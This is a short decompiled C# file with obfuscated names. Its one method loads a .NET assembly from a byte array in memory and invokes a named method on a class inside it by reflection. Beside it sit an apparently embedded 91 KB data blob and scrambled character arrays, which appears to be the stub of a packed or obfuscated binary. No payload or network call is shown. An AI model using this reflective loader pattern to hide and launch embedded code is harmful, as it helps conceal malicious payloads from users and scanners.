using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class3
{
	public sealed class Class4
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 91649)]
		private struct Struct1
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		private struct Struct2
		{
		}

		internal static byte byte_0/* Not supported: data(00) */;

		private static readonly char[] char_0;

		private static readonly char[] char_1;

		private static readonly string[] string_0;

		internal static byte byte_1/* Not supported: data(00) */;

		public static object smethod_0(byte[] byte_2, string string_1, string string_2, object[] object_0)
		{
			Assembly assembly = Assembly.Load(byte_2);
			Type[] types = assembly.GetTypes();
			int num = 0;
			Type type;
			object result = default(object);
			while (true)
			{
				if (num < types.Length)
				{
					type = types[num];
					if (type.IsClass && type.FullName!.EndsWith("." + string_1))
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				return result;
			}
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
			return RuntimeHelpers.GetObjectValue(type.InvokeMember(string_2, BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), object_0));
		}

		static Class4()
		{
			char_1 = new char[8];
			char[] array = new char[8];
			array[5] = '㻯';
			array[6] = '⡏';
			array[3] = '㤹';
			array[2] = 'Ґ';
			array[7] = '☎';
			array[4] = 'ฯ';
			array[0] = 'Շ';
			array[1] = '\u2e62';
			string_0 = new string[1];
			char_0 = array;
		}
	}
}
